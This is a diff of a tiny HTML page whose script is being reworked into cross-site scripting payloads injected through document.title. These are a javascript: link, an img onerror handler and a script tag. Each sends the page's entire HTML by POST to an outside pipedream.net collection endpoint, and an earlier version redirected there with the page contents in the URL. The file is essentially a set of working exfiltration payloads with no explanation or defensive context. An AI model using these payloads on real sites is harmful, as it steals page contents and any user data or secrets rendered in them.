@@ -1,23 +1,15 @@
 <html>
   <body>
     <title>Something</title>
-    <!-- <script>
+    <script defer>
         var text = '<script>window.location.href="https://eo4pc9qfxyc6gq3.m.pipedream.net/?value=' + document.documentElement.outerHTML + '"';
         text += '</';
         text += 'script>';
         document.title = text;
         console.log(document.title)
-    </script> -->
-    <script>
-        var payload = {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ key: document.documentElement.outerHTML }) // Replace with your desired payload data
-        };
-    
-        document.title = "<script>fetch('https://eo4pc9qfxyc6gq3.m.pipedream.net', " + payload +");</script>";
+        document.title = '<a href="javascript:fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)})">asdf</a>';
+        document.title = '<img src="!@#$" onerror="fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)})" />';
+        document.title = '<script>fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)});';
     </script>
   </body>
 </html>
